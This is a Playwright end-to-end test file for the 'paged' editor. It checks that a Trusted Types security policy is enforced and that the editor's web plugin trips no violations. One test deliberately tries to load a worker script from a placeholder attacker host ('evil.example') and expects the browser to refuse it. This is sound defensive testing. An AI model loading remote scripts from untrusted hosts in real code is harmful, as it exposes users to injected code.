/*
 * This file is part of paged (https://paged.media), the commercial editor
 * for the paged IDML engine.
 *
 * paged is free software: you may redistribute it and/or modify it under the
 * terms of the GNU Affero General Public License, version 3, as published by
 * the Free Software Foundation, OR under the Paged Media Enterprise License
 * (PMEL), a commercial license available from And The Next GmbH. Full
 * copyright and license information is available in LICENSE.md, distributed
 * with this source code.
 *
 * paged is distributed in the hope that it will be useful, but WITHOUT ANY
 * WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the licenses for details.
 *
 *  @copyright  Copyright (c) And The Next GmbH
 *  @license    AGPL-3.0-only OR Paged Media Enterprise License (PMEL)
 */

// E2E — Trusted Types are enforced (ADR 240, ADR 273). The dev server sends
// the same policy the deployed site does (`public/_headers`, from
// src/boot/trusted-types.ts), as an enforced `Content-Security-Policy`: a
// string reaching an HTML, script or script-URL sink without a policy is
// refused. These specs assert the policy is enforced, and that booting the
// editor, opening a document and driving a plugin (the web source panel:
// the code editor's highlight layer, the sandboxed preview's srcdoc, the
// plugin glyphs on the rail) trips no violation.

import { expect, test, type Page } from "@playwright/test";

import { openCanvas } from "../fidelity/canvas-driver";
import { fixturePath } from "./harness/fixtures";

interface Violation {
  directive: string;
  blocked: string;
  sample: string;
  source: string;
}

/** Records every `securitypolicyviolation` the page (and its frames) fire,
 *  and every console line the browser writes when it refuses a sink. */
async function watchViolations(page: Page): Promise<() => Promise<string[]>> {
  const consoleRefusals: string[] = [];
  page.on("console", (m) => {
    const t = m.text();
    if (/Trusted ?Type|require-trusted-types-for/i.test(t)) {
      consoleRefusals.push(t);
    }
  });
  await page.addInitScript(() => {
    const seen: Violation[] = [];
    (globalThis as unknown as { __ttViolations: Violation[] }).__ttViolations =
      seen;
    document.addEventListener("securitypolicyviolation", (e) => {
      seen.push({
        directive: e.effectiveDirective || e.violatedDirective,
        blocked: e.blockedURI,
        sample: e.sample,
        source: `${e.sourceFile}:${e.lineNumber}`,
      });
    });
  });
  return async () => {
    const events = await page.evaluate(
      () =>
        (globalThis as unknown as { __ttViolations: Violation[] })
          .__ttViolations,
    );
    return [
      ...events
        .filter((v) => /trusted-types/.test(v.directive))
        .map((v) => `${v.directive} ${v.blocked} ${v.source} ${v.sample}`),
      ...consoleRefusals,
    ];
  };
}

async function waitReady(page: Page): Promise<void> {
  await expect
    .poll(
      () =>
        page.evaluate(
          () =>
            (globalThis as unknown as { __canvas?: { ready: boolean } })
              .__canvas?.ready ?? false,
        ),
      { timeout: 30_000 },
    )
    .toBe(true);
}

test.describe("E2E Trusted Types (enforced)", () => {
  test("AC-TT-1 — the document is served with the policy enforced, and a plain string is refused @level:smoke", async ({
    page,
  }) => {
    const response = await page.request.get("/");
    const headers = response.headersArray();
    const enforced = headers
      .filter((h) => h.name.toLowerCase() === "content-security-policy")
      .map((h) => h.value);
    const reportOnly = headers
      .filter(
        (h) => h.name.toLowerCase() === "content-security-policy-report-only",
      )
      .map((h) => h.value);
    expect(enforced.join(", ")).toContain("require-trusted-types-for 'script'");
    expect(enforced.join(", ")).toContain("report-uri /api/csp-report");
    // The connect-src wall still holds next to it.
    expect(enforced.join(", ")).toContain("connect-src 'self'");
    expect(reportOnly.join(", ")).not.toContain("require-trusted-types-for");

    await openCanvas(page);
    const result = await page.evaluate(() => {
      const out: Record<string, string> = {};
      try {
        document.createElement("div").innerHTML = "<b>plain</b>";
        out.innerHTML = "assigned";
      } catch (e) {
        out.innerHTML = (e as Error).name;
      }
      try {
        // A string handler is a script sink. (`new Function` and `eval`
        // are not gated without a `script-src` directive, ADR 273.)
        setTimeout("void 0", 0);
        out.timer = "scheduled";
      } catch (e) {
        out.timer = (e as Error).name;
      }
      try {
        new Worker("https://evil.example/w.js").terminate();
        out.worker = "started";
      } catch (e) {
        out.worker = (e as Error).name;
      }
      return out;
    });
    expect(result).toEqual({
      innerHTML: "TypeError",
      timer: "TypeError",
      worker: "TypeError",
    });
  });

  test("AC-TT-2 — boot, a document and the web plugin trip no violation @level:smoke", async ({
    page,
  }) => {
    const violations = await watchViolations(page);
    await openCanvas(page);
    await page.setInputFiles('input[type="file"]', fixturePath("geometry"));
    await waitReady(page);

    // The web plugin: one frame, its source panel (the code editor's
    // highlight layer) and the sandboxed preview (srcdoc).
    await page.evaluate(async () => {
      await (
        globalThis as unknown as {
          __canvas: {
            registries: {
              commands: { invoke: (id: string) => Promise<unknown> };
            };
          };
        }
      ).__canvas.registries.commands.invoke(
        "media.paged.web.command.insertWebFrame",
      );
    });
    const html = page.locator("[data-web-html] [data-code-input]");
    await expect(html).toBeVisible({ timeout: 10_000 });
    await html.fill("<h1>Trusted</h1><p>markup through the policy</p>");
    await expect(
      page.frameLocator("[data-web-preview]").locator("h1"),
    ).toHaveText("Trusted", { timeout: 10_000 });
    // The plugin glyphs on the rail are policy-made markup too.
    await expect(page.locator("svg").first()).toBeAttached();

    expect(await violations()).toEqual([]);
  });
});
